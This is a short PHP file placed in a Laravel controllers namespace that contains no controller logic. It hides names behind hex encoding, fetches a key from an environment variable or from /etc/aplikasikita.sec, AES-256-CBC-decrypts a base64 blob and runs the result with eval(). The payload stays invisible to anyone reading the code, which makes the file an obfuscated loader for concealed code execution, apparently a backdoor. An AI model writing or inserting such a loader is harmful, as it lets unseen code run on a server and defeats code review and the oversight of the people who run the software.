<?php
namespace App\Http\Controllers;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('YfRZzwLS2HQnfHb2HJiEVA==');

$c=base64_decode(

'I+O44J+G+GRmDbSdIX/GDGPiHjECxiSk6K5ZWd3f60tWxVlkCtIM++uLJoQpjAWP3ImzRDPB+xcJ' .
'JgVwRAm0Veb8yCcNZAAI0GGEqbeUD8jZXDegwfYPxDv8VEiX0zL82eh/0q0kFngzgVVpgw/xY4MV' .
'D4FqXUeq2Z4WARRTwN6x3MSogSBNKHWfw3O+GdvOvzUeWCxvMCavdNewjpiFOLb0MSVNoK664MLq' .
'pHvIyAT1SEVpJMo9KkrQ7PB+cdWKvIxojqvjr6le1ohqWT1N7Q=='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

